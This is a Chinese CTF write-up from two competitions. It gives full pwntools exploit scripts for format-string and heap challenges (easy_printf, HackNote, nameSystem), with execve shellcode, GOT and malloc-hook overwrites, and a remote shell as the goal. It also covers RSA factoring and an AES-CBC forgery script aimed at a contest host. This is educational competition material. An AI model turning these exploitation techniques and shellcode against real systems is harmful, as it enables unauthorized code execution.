周末打了湖湘杯和省赛，凑一篇wp（

# byb2019

就解了一题，第一题逆向看的我头疼，难死了，第二题逆向。。。。（

## easy_printf

pwnable.tw原题魔改，`bss`没有`stdin`,`stdout`,`stderr`了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把`stdout`的`fileno`改为`2`，就可以绕过`close(1)`了
而且刚好
```asm
 ► 0x40089f <func1+57>    mov    eax, 0
   0x4008a4 <func1+62>    call   func2 <0x4007fa>
 
   0x4008a9 <func1+67>    mov    eax, 0
   0x4008ae <func1+72>    mov    rcx, qword ptr [rbp - 8]
   0x4008b2 <func1+76>    xor    rcx, qword ptr fs:[0x28]
   0x4008bb <func1+85>    je     func1+92 <0x4008c2>
 
   0x4008bd <func1+87>    call   0x400648
 
   0x4008c2 <func1+92>    leave  
   0x4008c3 <func1+93>    ret    
 
   0x4008c4 <main>        push   rbp
   0x4008c5 <main+1>      mov    rbp, rsp
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 ('AAAAAAAA')
01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff
02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087
```

名字下面残留有`stderr`，所以读取名字时,`partial overwrite`改为`_IO_2_1_stdout_->_fileno`，然后把`_fileno`改为2即可，后面的和`pwnable.tw`没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩

exp为:

```python
from pwn import *

def fmtstr(offset, addr, data, written):
	cnt = 0
	payload = ''
	address = ''
	for x in data:
		cur = ord(x)
		if cur >= written&0xff:
			to_add = cur - (written&0xff)
		else:
			to_add = 0x100 + cur - (written&0xff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%{}$hhn".format(offset+cnt+len(data)*2)
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+cnt)
		cnt+=1
	return payload + address


def main(host,port=12001):
	if host:
		p = remote(host,port)
	else:
		# p = process("./easy_printf",env={"LD_PRELOAD":"./libc.so"})
		p = process("./easy_printf")
		gdb.attach(p,"b *0x000000000400846")
	p.recvuntil("write down your name")
	# t = raw_input('guess: ')
	t = 0x7
	stdout_fileno = (int(t) << 12) | 0x690
	p.send("A"*0x10+p16(stdout_fileno))
	pause()
	
	buf_addr = 0x601060
	payload =  "%{}c%28$hhn%{}c%58$hn".format(2,0x2a6).ljust(0x18,'_')
	payload += fmtstr(9,buf_addr,p64(0x000000000400814)[:3],0x2ab)
	p.send(payload)
	pause()
	
	
	payload =  "%{}c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-".format(0x14)
	p.send(payload)
	pause()
	p.recvuntil("^")
	stack = int(p.recvuntil('-',drop=True),16)
	p.recvuntil("*")
	libc.address = int(p.recvuntil('-',drop=True),16)-0x20837
	info("stack : " + hex(stack))
	info("libc : " + hex(libc.address))
	onegadget = 0xf1147+libc.address
	
	ret_addr = stack - 0x1e8
	payload =  "%{}c%23$hhn".format(0x14).ljust(0x10,'_')
	payload += fmtstr(15,ret_addr,p64(onegadget)[:2],0x19)
	p.send(payload)
	pause()
	# :0000000000400865                 retn
	offset = 13
	payload =  "%{}c%16$hhn%{}c%17$hn".format(ord(p64(onegadget)[2:3]),0x865-ord(p64(onegadget)[2:3])).ljust(0x18,'_')
	payload += p64(ret_addr+2)+p64(ret_addr-8)
	payload = payload.ljust(0x80,"\x00")
	p.send(payload)
	p.interactive()
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	main(args['REMOTE'])
```
具体攻击流程可以看[https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Unprintable](https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Unprintable)

## math

Thanks @cmdrgh 

赛后复现，题目

```python
from libnum import *
from Crypto.Util.number import *
from gmpy2 import next_prime
from flag import flag
flag = s2n(flag)
a = getRandomRange(pow(10,499),pow(10,500))
b = getRandomRange(pow(10,499),pow(10,500))
p = a*pow(10,500)+b
q = b*pow(10,500)+a
print p*q		#n0
e = 65537
c = getRandomInteger(100)
p = next_prime(p+c)
q = next_prime(q+c)
n = p*q
print n			#n
flag = pow(flag,e,n)
print flag
```
题目给了n0，和n，还有密文和公钥e

我们可以看到

```
n0 = a*b*pow(10,1000)+a*a*pow(10,500)+b*b*pow(10,500)+a*b
```

因为

```python
pow(10,499) < a < pow(10,500),pow(10,499) < b < pow(10,500)
pow(10,998) < a*b < pow(10,1000)	#好像是这样。。。
```

所以从`n0`中可以提取出`a*b`的后500位和前500位，拼出`a*b`

然后

```pythoh
a*a + b*b = n0-(pow(10,1000)+1)*a*b
(a + b)^2 = a*a + b*b + 2*a*b
(a - b)^2 = a*a + b*b - 2*a*b
```

即可求出a和b，考虑到进位的情况（就是前500位可能因为进位稍微有点偏差）

```python
import gmpy2
from Crypto.Util.number import *

n0 = 37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860
ab = 3729015316596929817074776748798776710660495632759045930962331088443664586738540522683692382643976040223218219904704229874097094111475740275803533822735298188434519430418307941051290472051619700245959864365980238371813769897455787028036658558639238547023559777767259336078874439837569089854697180138882119423477537395269813433588599169471494997467948256460081576637738889503780922216880055422261994024085371796563714989776514977095699150345999578688999546152033298078756696776724344575445038055316615519829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860

aabb = (n0-(pow(10,1000)+1)*ab)/pow(10,500)

a_plus_b = int(gmpy2.iroot(aabb + 2*ab,2)[0])
a_minus_b = int(gmpy2.iroot(aabb - 2*ab,2)[0])

a = (a_plus_b+a_minus_b)/2
b = (a_plus_b-a_minus_b)/2

p = a*pow(10,500)+b
q = b*pow(10,500)+a

print p
print q
# print p*q == n0
```

求得了a和b，现在就是求c了，可以用2分法来爆破求出c

```python
import gmpy2
def binary_search(c1,c2):
	c = (c2+c1)/2
	p = 7724533844747394899349412339828776507222531964570563673657731510573489841606241899431933799753548435100266998960524464930676080336780106550530528156652698098697939066388001862335776045810162308820460444103489118460484370360374490252853308767775503254680817659918620827189505621697773686635428578989940339364335258812085155863395156211658749886912345720117817903261544675017614190883555615406264212068632733125247667940798492107549869436238502679059874386631718816248039209963903483751137734845937488448274956023820422762712035969893644873130710756898125766905141097162634971719675541937272502083073371337486398745408176446378960949530179254458951059359334312627484778865569189174918141307780733163571737089532375061096755773211249431675122668604315339846808046876666178988233969079030213364891617388431952560954924381712484465088395641644984415182477503907081799371321500277312785408279987356973984610573989890126043071505051543960194615504894391665369281429295377569609839082507454042128770271891415
	q = 4827495602382042276271203596989364487313071075689812576690514109716263497171967554193727250208307337133748639874540817644637896094953017925445895105935933431262748477886556918917491814130778073316357173708953237506109675577321124943167512266860431533984680804687666617898823396907903021336489161738843195256095492438171248446508839564164498441518247750390708179937132150027731278540827998735697398461057398989012604307150505154396019461550489439166536928142929537756960983908250745404212877027189141577245338447473948993494123398287765072225319645705636736577315105734898416062418994319337997535484351002669989605244649306760803367801065505305281566526980986979390663880018623357760458101623088204604441034891184604843703603744902528533087677755032546808176599186208271895056216977736866354285789899403393643352588120851558633951562116587498869123457201178179032615446750176141908835556154062642120686327331252476679407984921075498694362385026790598743866317188162480392099639034837511377348459374884
	n = 37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921
	p = gmpy2.next_prime(p+c)
	q = gmpy2.next_prime(q+c)
	if p*q == n:
		print 'p:' + str(p)
		print 'q:' + str(q)
		exit(0)
	elif p*q < n:
		print hex(c)
		binary_search(c,c2)
	else:
		print hex(c)
		binary_search(c1,c)

binary_search(1,2**100)

# p:7724533844747394899349412339828776507222531964570563673657731510573489841606241899431933799753548435100266998960524464930676080336780106550530528156652698098697939066388001862335776045810162308820460444103489118460484370360374490252853308767775503254680817659918620827189505621697773686635428578989940339364335258812085155863395156211658749886912345720117817903261544675017614190883555615406264212068632733125247667940798492107549869436238502679059874386631718816248039209963903483751137734845937488448274956023820422762712035969893644873130710756898125766905141097162634971719675541937272502083073371337486398745408176446378960949530179254458951059359334312627484778865569189174918141307780733163571737089532375061096755773211249431675122668604315339846808046876666178988233969079030213364891617388431952560954924381712484465088395641644984415182477503907081799371321500277312785408279987356973984610573989890126043071505051543960194615504894391665369281429295377569610089141920160594629035017467443
# q:4827495602382042276271203596989364487313071075689812576690514109716263497171967554193727250208307337133748639874540817644637896094953017925445895105935933431262748477886556918917491814130778073316357173708953237506109675577321124943167512266860431533984680804687666617898823396907903021336489161738843195256095492438171248446508839564164498441518247750390708179937132150027731278540827998735697398461057398989012604307150505154396019461550489439166536928142929537756960983908250745404212877027189141577245338447473948993494123398287765072225319645705636736577315105734898416062418994319337997535484351002669989605244649306760803367801065505305281566526980986979390663880018623357760458101623088204604441034891184604843703603744902528533087677755032546808176599186208271895056216977736866354285789899403393643352588120851558633951562116587498869123457201178179032615446750176141908835556154062642120686327331252476679407984921075498694362385026790598743866317188162480392349698447544063877613204952747

```

求出真正的p和q，那就可以求出明文了

```python
import gmpy2
from Crypto.Util.number import *

p = 7724533844747394899349412339828776507222531964570563673657731510573489841606241899431933799753548435100266998960524464930676080336780106550530528156652698098697939066388001862335776045810162308820460444103489118460484370360374490252853308767775503254680817659918620827189505621697773686635428578989940339364335258812085155863395156211658749886912345720117817903261544675017614190883555615406264212068632733125247667940798492107549869436238502679059874386631718816248039209963903483751137734845937488448274956023820422762712035969893644873130710756898125766905141097162634971719675541937272502083073371337486398745408176446378960949530179254458951059359334312627484778865569189174918141307780733163571737089532375061096755773211249431675122668604315339846808046876666178988233969079030213364891617388431952560954924381712484465088395641644984415182477503907081799371321500277312785408279987356973984610573989890126043071505051543960194615504894391665369281429295377569610089141920160594629035017467443
q = 4827495602382042276271203596989364487313071075689812576690514109716263497171967554193727250208307337133748639874540817644637896094953017925445895105935933431262748477886556918917491814130778073316357173708953237506109675577321124943167512266860431533984680804687666617898823396907903021336489161738843195256095492438171248446508839564164498441518247750390708179937132150027731278540827998735697398461057398989012604307150505154396019461550489439166536928142929537756960983908250745404212877027189141577245338447473948993494123398287765072225319645705636736577315105734898416062418994319337997535484351002669989605244649306760803367801065505305281566526980986979390663880018623357760458101623088204604441034891184604843703603744902528533087677755032546808176599186208271895056216977736866354285789899403393643352588120851558633951562116587498869123457201178179032615446750176141908835556154062642120686327331252476679407984921075498694362385026790598743866317188162480392349698447544063877613204952747
c = 37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839
phi = (p-1)*(q-1)
e = 65537
d = gmpy2.invert(e,phi)

plain = long_to_bytes(pow(c,d,p*q))

print plain
#flag{ddc4205ecd6c22035acae589113bb8aa}
```

# hxb

湖湘杯，没啥好说的。。

## icekey

`.net`逆向，`dnSpy`启动，动态调试就行，程序后面会解密，直接把解密的内容改为
```c
a3acf8d62aaa0b6:                        // DATA XREF: __main↑o
    text "UTF-16LE", "3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713"
    text "UTF-16LE", "BE65502A5107A",0
```
跑一下就好了（其实我根本没看懂怎么加密解密的
![](./result.png)

## HackNote

这题还临时该文件的，不知道说啥了，第一版，`unlink`后控制整个数组，改`__free_hook`为`shellcode`地址就好,因为程序数据段可执行

第一版exp为：

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("xit")
	p.recvuntil("-----------------")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(sz))
	p.recvuntil("Note:")
	p.send(content)

def dele(idx):
	cmd(2)
	p.sendlineafter("Index of Note:",str(idx))
def edit(idx,content):
	cmd(3)
	p.sendlineafter("Index of Note:",str(idx))
	p.recvuntil("Note:")
	p.send(content)

def main(host,port=12604):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./HackNote")
		# p = process("./HackNote",env={"LD_PRELOAD":"./x64_libc.so.6"})
		# gdb.attach(p,"b *0x000000000400CB1")
		gdb.attach(p)
		# debug(0x0000000000000A69)
	add(0xf8,"A\n")	#0
	add(0xf8,"A\n")	#1
	add(0xf8,"A\n")	#2
	add(0xf8,"A\n")	#3
	edit(3,"A"*0xf8)
	add(0xf8,"B\n")	#4
	add(0x68,"C\n")	#5
	ptr_array = 0x0000000006CBC40
	payload = "A"*8+p64(0xf1)
	payload += p64(ptr_array)+p64(ptr_array+0x8)
	payload = payload.ljust(0xf0,"\x00")
	payload += p64(0xf0)+'\n'
	edit(3,payload)
	dele(4)
	edit(3,p64(ptr_array)+'\n')
	# now we control the ptr array
	free_hook = 0x6CC988
	payload = p64(ptr_array)+p64(free_hook)
	payload += asm(shellcraft.sh())
	payload = payload.ljust(0x80,"\x00") 
	payload += p64(0x200)*2
	edit(0,payload+'\n')
	edit(1,p64(ptr_array+0x10)+'\n')
	dele(0)
	
	p.interactive()
	
if __name__ == "__main__":

	main(args['REMOTE'])
```

然后主办方临时把数组搬到了栈上，那也没啥事，换个思路就好了，先`overlap`,在中间夹一块`free`掉的`fastbin`就好，这次改`__malloc_hook`，也是改为`shellcode`的地址就好

exp为：

```python
from pwn import *

context.arch='amd64'

def cmd(command):
	p.recvuntil("xit")
	p.recvuntil("-----------------")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(sz))
	p.recvuntil("Note:")
	p.send(content)

def dele(idx):
	cmd(2)
	p.sendlineafter("Index of Note:",str(idx))
def edit(idx,content):
	cmd(3)
	p.sendlineafter("Index of Note:",str(idx))
	p.recvuntil("Note:")
	p.send(content)

def main(host,port=14604):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./HackNote")
	
		# gdb.attach(p,"b *0x000000000400CB1")
		gdb.attach(p)
	
	
	add(0xf8,"000\n")	#0
	add(0x38,"111\n")	#1
	edit(1,"A"*0x38)
	add(0xf8,"222\n")	#2
	add(0x68,"333\n")	#3
	dele(0)
	edit(1,"A"*0x30+p64(0x140)+'\n')
	dele(2)
	dele(1)
	add(0xc8,"000\n")	#0
	payload = "A"*0x28+p64(0x41)+p64(0x6cb772)
	add(0xf8,payload+'\n')
	add(0x38,"1111\n")
	payload = "\x00"*6+p64(0x6cb790)
	payload += asm('''
		mov rdx,0x68732f6e69622f
		push rdx
		mov rdi,rsp
		xor rsi,rsi
		xor rdx,rdx
		push 0x3b
		pop rax
		syscall
	''')
	add(0x38,payload+'\n')
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(1))
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

## nameSystem

Thanks @V1ct0r

`dele`的时候有问题，先`add`满，然后`dele(18)`,就造成了`double free`了，我脑抽了`exp`写的很复杂，先攻击到数组，然后在数组里面构造了一个假的`chunk`释放掉，以备后面使用

```c
pwndbg> telescope 0x6020a0 30
00:0000│   0x6020a0 ◂— 0x0
01:0008│   0x6020a8 ◂— 0x51 /* 'Q' */
02:0010│   0x6020b0 ◂— 0x0
03:0018│   0x6020b8 —▸ 0x6020b0 ◂— 0x0
04:0020│   0x6020c0 —▸ 0x602048 —▸ 0x7fd85d70a250 (read) ◂— cmp    dword ptr [rip + 0x2d24e9], 0
05:0028│   0x6020c8 ◂— 0x0
... ↓
0b:0058│   0x6020f8 ◂— 0x21 /* '!' */
0c:0060│   0x602100 —▸ 0x1349860 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓
10:0080│   0x602120 —▸ 0x1349240 ◂— 0x4141414141414141 ('AAAAAAAA')
11:0088│   0x602128 —▸ 0x1349860 ◂— 0x4141414141414141 ('AAAAAAAA')
12:0090│   0x602130 —▸ 0x60209d ◂— 0x0
13:0098│   0x602138 ◂— 0x0
```

然后又攻击了`free@got`改成了`puts`泄露`libc`，然后在`fastbin dup`攻击`__realloc_hook`和`__malloc_hook`来`getshell`

exp为:

```python
from pwn import *

context.arch='amd64'

def cmd(command):
	p.recvuntil("Your choice :")
	p.sendline(str(command))
def add(sz,name):
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(sz))
	p.recvuntil("Name:")
	p.send(name)

def dele(idx):
	cmd(3)
	p.sendlineafter("to delete:",str(idx))

def main(host,port=21605):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./NameSystem")
	
		# gdb.attach(p,"b *0x000000000400CB1")
		gdb.attach(p)
	ptr_array = 0x0000000006020A0
	for i in range(20):
		add(0x60,"A"*0x60)
	dele(18)
	for i in range(4):
		dele(0)
	dele(19)
	dele(0)
	dele(17)
	dele(0)
	dele(15)
	
	add(0x60,p64(ptr_array-0x13)+'\n')
	add(0x60,"A"*0x60)
	add(0x60,"A"*0x60)
	payload = "\x00"*3+p64(0)+p64(0x51)
	payload += p64(0)+p64(0x6020b0)+p64(elf.got["read"])
	payload += "\x00"*0x30+p64(0x21)[:5]
	
	add(0x60,payload)
	
	dele(3)
	
	for i in range(0xa):
		add(0x50,"A"*0x50)
	
	dele(18)
	dele(19)
	dele(0xb)
	dele(9)
	dele(0x10)
	dele(0xd)
	dele(0xd)
	add(0x50,p64(0x601ffa)+'\n')
	add(0x50,"A"*0x50)
	add(0x50,"A"*0x50)
	payload = "\x00"*0xe+p64(elf.plt["puts"])[:6]
	add(0x50,payload+'\n')
	dele(3)
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - libc.symbols["read"] 
	info("libc : " + hex(libc.address))
	add(0x40,p64(0)*4+'\n')
	add(0x60,p64(libc.symbols["__malloc_hook"]-0x23)+'\n')
	add(0x60,"A"*0x60)
	add(0x60,"A"*0x60)
	payload = "\x00"*0xb+p64(libc.address+0x4526a)+p64(libc.symbols["realloc"]+8)
	add(0x60,payload+'\n')
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(32).ljust(0x10,"\x00"))
	
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./NameSystem",checksec=False)
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])

```

打通后想起来自己很傻逼，搞得这么复杂，直接把`free@got`改为`printf`不就好了🐎，所以就又写了一份`exp`

在攻击`free@got`之前，我先布置好了堆和指针数组的布局为

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x140e340 —▸ 0x140e300 —▸ 0x140e2c0 —▸ 0x140e280 —▸ 0x140e240 ◂— ...
0x50: 0x0
0x60: 0x140e540 —▸ 0x140e480 ◂— 0x140e540
0x70: 0x140e6f0 —▸ 0x140e610 ◂— 0x140e6f0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> telescope 0x6020a0 21
00:0000│   0x6020a0 —▸ 0x140e390 ◂— 0x4242424242424242 ('BBBBBBBB')
01:0008│   0x6020a8 —▸ 0x140e3d0 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│   0x6020b0 —▸ 0x140e430 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│   0x6020b8 —▸ 0x140e550 —▸ 0x140e480 ◂— 0x0
04:0020│   0x6020c0 —▸ 0x140e5b0 ◂— 0x4141414141414141 ('AAAAAAAA')
05:0028│   0x6020c8 —▸ 0x140e700 —▸ 0x140e610 ◂— 0x0
06:0030│   0x6020d0 ◂— 0x0
... ↓

```

两个`fastbindup`，第一个改`free@got`为`printf`,第二个改`free@got`为`system`

exp为：

```python
from pwn import *

context.arch='amd64'

def cmd(command):
	p.recvuntil("Your choice :")
	p.sendline(str(command))
def add(sz,name):
	cmd(1)
	p.recvuntil("Size:")
	p.sendline(str(sz))
	p.recvuntil("Name:")
	p.send(name)

def dele(idx):
	cmd(3)
	p.sendlineafter("to delete:",str(idx))

def main(host,port=21605):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./NameSystem")
	
		# gdb.attach(p,"b *0x000000000400CB1")
		# gdb.attach(p)
	ptr_array = 0x0000000006020A0
	for i in range(15):
		add(0x30,"B"*0x30)
	for i in range(5):
		add(0x50,"A"*0x50)
	dele(18)
	dele(0)
	dele(19)
	dele(0)
	dele(15)
	dele(16)
	for i in range(4):
		add(0x60,"A"*0x60)
	dele(18)
	dele(0)
	dele(19)
	dele(0)
	dele(15)
	dele(16)
	for i in range(10):
		dele(0)
	gdb.attach(p)	
	
	add(0x50,p64(0x601ffa)+'\n')
	add(0x50,"A"*0x50)
	add(0x50,"A"*0x50)
	payload = "\x00"*0x6+p64(0x71)+p64(elf.plt["printf"])[:6]
	add(0x50,payload+'\n')
	
	# idx --> 0xa
	add(0x30,"%3$p=%13$p*\n")
	dele(0xa)
	stack = int(p.recvuntil('=',drop=True),16)
	libc.address = int(p.recvuntil('*',drop=True),16)-0x20830
	info("stack : " + hex(stack))
	info("libc : " + hex(libc.address))
	add(0x60,p64(0x602008)+'\n')
	add(0x60,"/bin/sh\x00\n")
	add(0x60,"A"*0x60)
	add(0x60,p64(libc.symbols["system"])[:6]+'\n')
	dele(0xb)
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./NameSystem",checksec=False)
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])

```

## ezre

走迷宫

```python
maps = [
  0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x00, 
  0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 
  0x10, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 
  0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x0C, 0x00, 
  0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x00, 
  0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x0D, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 
  0x0A, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 
  0x00, 0x00, 0x63, 0x00, 0x00, 0x00
]


l = []
for i in range(49):
	l.append(hex(maps[4*i])[2:])
	
for i in range(7):
	print l[i*7:i*7+7]
	
route = 'SDDWDDDSSSSAAWAAASSDDSDDDD'
r = ''
for i in route:
	if i == 'W':
		print 1
	elif i == 'S':
		print 2
	elif i == 'A':
		print 3
	else:
		print 4

```

## give_me_passport

水题

```pytho
from Crypto.Cipher import AES
from pwn import *
p = remote("183.129.189.62",13406)
p.recvuntil("passport is ")
admin = "Admin".ljust(0x10,chr(0x10-5))
KEY = b'JustKey not fl@g'
iv = p.recv(32)
cipher = AES.new(KEY, AES.MODE_CBC, iv.decode('hex'))
p.recvuntil("10 minutes!")
p.sendline(iv + cipher.encrypt(admin).encode('hex'))
p.interactive()
```
## ea_rsa

Thanks @cmdrgh

题目：

```python
from Crypto.Util.number import *

import gmpy2

flag = open("flag.txt","rb").read()
m=bytes_to_long(flag)
p=getPrime(1024)
q=getPrime(1024)
n=p*q
e=65537
c=pow(m,e,n)
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
dp=d%(p-1)
print dp,n,e,c
```

可以看到多给了一个dp，而`dp = d % (p-1)`

我们知道

```
de ≡ 1(mod phi) 
```
从而
```
dp*e-1 ≡ 0(mod p-1) 
```
所以`dp*e-1`是`p-1`的倍数，所以爆破就好了

```python
import gmpy2

from Crypto.Util.number import long_to_bytes

e = 65537
n = 22000596569856085362623019573995240143720890380678581299411213688857584612953014122879995808816872221032805734151343458921719334360194024890377075521680399678533655114261000716106870610083356478621445541840124447459943322577740268407217950081217130055057926816065068275999620502766866379465521042298370686053823448099778572878765782711260673185703889168702746195779250373642505375725925213796848495518878490786035363094086520257020021547827073768598600151928787434153003675096254792245014217044607440890694190989162318846104385311646123343795149489946251221774030484424581846841141819601874562109228016707364220840611
dp = 84373069210173690047629226878686144017052129353931011112880892379361035492516066159394115482289291025932915787077633999791002846189004408043685986856359812230222233165493645074459765748901898518115384084258143483508823079115319711227124403284267559950883054402576935436305927705016459382628196407373896831725
